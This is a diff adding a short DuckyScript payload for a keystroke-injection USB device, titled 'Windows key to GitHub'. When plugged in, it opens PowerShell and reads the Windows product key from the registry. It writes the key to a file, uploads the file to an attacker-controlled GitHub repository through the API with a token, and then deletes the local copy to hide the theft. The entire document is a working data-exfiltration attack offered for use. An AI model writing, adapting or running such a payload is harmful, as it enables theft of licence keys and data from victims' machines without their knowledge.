@@ -1,0 +1,20 @@
+REM Windows key to GitHub
+
+GUI r
+DELAY 200
+STRING powershell
+DELAY 100
+ENTER
+DELAY 500
+STRING (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform").BackupProductKeyDefault | Out-File "$env:USERPROFILE\Desktop\WindowsKeys.txt"
+ENTER
+DELAY 200
+STRING $token="GITHUB TOKEN HERE"; $repo="USERNAME/GITHUB REPO HERE"; $uri="https://api.github.com/repos/$repo/contents/WindowsKeys.txt"; $file = "$env:USERPROFILE\Desktop\WindowsKeys.txt"; try { $existingData = Invoke-RestMethod -Uri $uri -Headers @{Authorization="Bearer $token"} -Method GET; $existingDecoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($existingData.content)); $sha = $existingData.sha } catch { $existingDecoded = ""; $sha = $null }; $newContent = $existingDecoded + "`n" + (Get-Content $file -Raw); $body = @{message="append WindowsKeys.txt"; content=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($newContent))}; if ($sha) { $body.sha = $sha }; $bodyJson = $body | ConvertTo-Json; Invoke-RestMethod -Uri $uri -Headers @{Authorization="Bearer $token"} -Method Put -Body $bodyJson
+DELAY 100
+ENTER
+DELAY 100
+STRING Remove-Item "$env:USERPROFILE\Desktop\WindowsKeys.txt"
+DELAY 100
+ENTER
+STRING exit
+ENTER
